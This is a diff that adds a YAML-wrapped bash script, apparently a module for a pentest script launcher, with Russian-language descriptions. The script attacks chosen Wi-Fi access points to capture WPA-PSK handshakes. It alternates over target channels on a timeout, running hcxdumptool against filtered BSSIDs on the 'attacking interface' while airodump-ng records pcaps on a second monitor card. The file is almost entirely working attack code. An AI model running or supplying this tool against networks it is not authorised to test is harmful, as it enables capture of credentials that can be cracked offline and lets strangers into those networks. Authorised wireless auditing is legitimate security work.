@@ -1,0 +1,121 @@
+description: |-
+  Запускает hxcdumptool и airodump на канале по таймауту.
+  
+author: vinzekatze
+
+tags:
+  - wpa-psk
+  - hcx pulsar
+  - handshake capture
+
+arguments:
+  i:
+    description: имя атакующего интерфейса
+    metavar: INTERFACE
+    replacer: '#hcx-wlan#'
+  m:
+    description: имя дополнительного мониторного интерфейса
+    metavar: INTERFACE
+    replacer: '#mon-wlan#'
+  b:
+    description: BSSID точек доступа для атаки (может принимать файлы со списками)
+    multiple: true
+    regex: '^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$|^[0-9A-Fa-f]{12}$'
+    metavar: BSSID
+    replacer: '#bssid#'
+  c:
+    description: >-
+      каналы атакуемых точек доступа (может принимать файлы со списками)
+    metavar: CHANNEL
+    multiple: true
+    regex: '\d+'
+    replacer: '#channels#'
+  t:
+    description: время в секундах для переключения между точками
+    default: 30
+    replacer: '#timeout#'
+    metavar: SECONDS
+    regex: '[0-9]+'
+  d:
+    description: директория, куда скрипт будет складывать .cap файлы (их будет много!)
+    default: 'pulsar-dump'
+    replacer: '#dir#'
+    metavar: DIRECTORY
+
+shell: bash
+mode:
+  readfile:
+    - b
+    - c
+  format:
+    b: >-
+      wlan addr3 {}
+    i: '{!r}'
+    m: '{!r}'
+    c: '{!r}'
+    t: '{}s'
+  join:
+    b: ' or '
+  pformat:
+    b: '{!r}'
+
+script: |-
+  interface=#hcx-wlan#;
+  monitor=#mon-wlan#;
+  outdir=#dir#;
+  OLDIFS=$IFS;
+  targs=#bssid#;
+  channels=#channels#;
+
+  # Проверки
+  iw dev $interface info 2>&1 1>/dev/null || { echo "Device $interface not found"; exit ; };
+  iw dev $monitor info 2>&1 1>/dev/null || { echo "Device $monitor not found"; exit ; };
+  
+  # Функции
+  stop_mon_screen() { sudo screen -S pulsar-dump-monitor-proc -X stuff '^C'; };
+  exit_func() { stop_mon_screen; rm -f ./temp.targets-filter.bpf; exit; };
+
+  hcxdumptool --bpfc="($targs)" > temp.targets-filter.bpf;
+  while true; do
+    for chn in $channels; do
+      # Параметры
+      hcxsfile=$(realpath $outdir/hcxdump-c${chn}-$(date +%Y%m%d%H%M%S));
+      monhsfile=$(realpath $outdir/mondump-c${chn}-$(date +%Y%m%d%H%M%S));
+      
+      # Мониторинг
+      echo -e "\e[1;92m[$monitor] Starting capture... \e[0m";
+      sudo screen -XS pulsar-dump-monitor-proc quit >/dev/null;
+      sudo nmcli dev set $monitor managed no; sleep 1;
+      sudo ip link set $monitor down;
+      sudo iw $monitor set monitor control;
+      sudo ip link set $monitor up;
+      sudo screen -dmS pulsar-dump-monitor-proc airodump-ng $monitor -c $chn --write $monhsfile --output-format pcap;
+
+      # hxcdumptool
+      echo -e "\e[1;92m[$interface] Starting attack with hcxdumptool... \e[0m";
+      iw dev $interface info 2>&1 1>/dev/null || { echo "Device $interface not found"; exit ; };
+      sudo nmcli dev set $interface managed no; sleep 1;
+      sudo ip link set $interface down;
+      sudo iw $interface set type managed;
+      sudo ip link set $interface up;
+      sudo nmcli dev set $interface managed yes; sleep 1;
+      if [ "$chn" -lt 15 ]; then 
+        hcx_chn="${chn}a";
+      else 
+        hcx_chn="${chn}b"; 
+      fi;
+      sudo timeout -s INT -k 20s #timeout# hcxdumptool -i $interface --rds=3 --bpf=temp.targets-filter.bpf -c $hcx_chn -w $hcxsfile;
+
+      # Выход
+      stop_mon_screen; sleep 1;
+      trap exit_func SIGINT;
+      echo; 
+      echo -e "\e[1;91m[pause] Press CTRL+C to exit\e[0m";
+      IFS=$OLDIFS;
+      for i in 5 4 3 2 1; do echo -n "$i... "; sleep 1; done; 
+      IFS=$'\n';
+      sudo screen -XS pulsar-dump-monitor-proc quit >/dev/null;
+      echo;
+    done;
+    IFS=$OLDIFS;
+  done
